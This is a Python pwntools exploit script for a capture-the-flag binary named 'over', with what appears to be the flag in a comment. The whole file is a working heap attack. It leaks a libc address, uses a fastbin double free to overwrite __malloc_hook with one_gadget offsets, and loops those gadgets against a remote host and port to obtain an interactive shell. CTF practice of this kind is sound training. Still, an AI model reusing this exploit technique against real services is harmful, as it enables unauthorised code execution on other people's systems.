#exploit for over
#h4c(oVEr14PpING_oV3R_B0ok)
from pwn import *
import time
elf = ELF("./over")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")
context.binary=elf
context.log_level='DEBUG'
gadgets=[0x45226,0x4527a,0xf0364,0xf0370,0xf1207]
for gadget in gadgets:
	target=remote('112.213.2.13',40003)
	def sla(string,val):
		target.sendlineafter(string,val)

	def sa(string,val):
		target.sendafter(string,val)

	def add(size,name_size,data="A",name="A",comment="A"):
		sla("choose manu\n",str(1))
		sla("input size\n",str(size))
		sa("book name\n",data)
		sla("input Name size\n",str(name_size))
		sa("Name\n",name)
		sa("Comment\n",comment)

	def delete(index):
		sla("choose manu\n",str(2))
		sla("input index\n",str(index))

	def info(index):
		sla("choose manu\n",str(3))
		sla("input index\n",str(index))

	def leaks(index):
		sla("choose manu\n",str(6))
		sla("input index\n",str(index))
		target.recvline()
		leak=target.recvline().strip("\n")
		return leak

	add(0x30,0x420)#0
	delete(0)
	libc_base=u64(leaks(0).ljust(8,"\x00"))-0x3c4b78
	libc_free_hook=libc_base+libc.sym["__free_hook"]
	libc_malloc_hook=libc_base+libc.sym["__malloc_hook"]
	libc_system=libc_base+libc.sym["system"]
	libc_gadget=libc_base+gadget
	tar=libc_base+0x3c56bd
	lib_addr=libc_base+0x3c56f0
	add(0x60,0x60)#1
	add(0x60,0x60)#2
	delete(1)
	delete(2)
	delete(1)
	add(0x60,0x60,p64(tar))#3
	payload="\x00"*(0x2b-8)+p64(libc_gadget)+p64(lib_addr-7*8)
	sla("choose manu\n",str(1))
	sla("input size\n",str(0x60))
	sa("book name\n","A")
	sla("input Name size\n",str(0x60))
	sa("Name\n",payload)
	target.interactive()
